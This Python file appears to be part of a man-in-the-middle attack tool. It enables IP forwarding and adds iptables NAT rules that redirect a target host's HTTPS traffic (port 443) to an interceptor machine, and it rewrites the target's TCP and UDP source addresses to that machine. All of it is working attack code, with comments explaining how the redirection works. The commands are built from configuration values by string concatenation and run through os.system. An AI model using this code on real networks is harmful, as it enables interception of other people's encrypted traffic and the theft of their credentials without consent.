import os
import logging

def enable_ip_forward():
	logging.info ( "Enabling ip forwarding..." )
	# sysctl -w net.ipv4.ip_forward=1
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forward():
	logging.info ( "Disabling ip forwarding..." )
	# sysctl -w net.ipv4.ip_forward=1
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def add_firewall_rules ( configs ):
	logging.info ( "Adding iptables rules:" )
	iptables_accept( configs )

def clean_firewall_rules ( configs ):
	logging.info ( "Cleaning firewall rules..." )
	iptables_clean( configs )

def iptables_clean ( configs ):
	os.system ( "iptables -t nat -F" )

def iptables_accept ( configs ):
	PORT = "443"

	# add an iptables rule to accept incoming packets destined to another node
	# if destination is server, jump DNAT --to my ip address
	# normally packets not destined to me are not processed by kernel or programs: kernel doesn't see them
	# DNAT destination network adress translation: rewrite destinaion address to the one i specify
	#command = "iptables -t nat -A PREROUTING -d "+configs['server']['ip']+" -j DNAT --to "+configs['mitm']['ip']

	# -s source -d destination -p protocol
	command = "iptables -t nat -A PREROUTING -i " + configs['interface'] + " -p TCP --dport " + PORT + " -j DNAT --to " + configs['mitm']['ip']
	# with this rule only https requests will be catched the other will be forwarded to the gateway with the same source IP ( as the DNS requests )
	os.system ( command )

	#command = "iptables -t nat -A PREROUTING -i " + configs['interface'] + " -p TCP -s " + configs['target']['ip'] + " -m multiport --dport " + PORT + ",80 -j DNAT --to " + configs['mitm']['ip']
	command = "iptables -t nat -A POSTROUTING -p UDP -s " + configs['target']['ip'] + " -j SNAT --to " + configs['mitm']['ip']
	logging.info( command )
	os.system ( command )

	command = "iptables -t nat -A POSTROUTING -p TCP -s " + configs['target']['ip'] + " -j SNAT --to " + configs['mitm']['ip']
	logging.info( command )

	#os.system ( "iptables -t nat -A PREROUTING -d %configs['target']['ip']% -j DNAT --to %configs['mitm']['ip']%" ) # port will be the one specified in the incoming packet
	# iptables -t nat -A PREROUTING -i eth0 -p TCP  --dport 443 -j DNAT --to 192.168.111.27:8083

	os.system ( command )


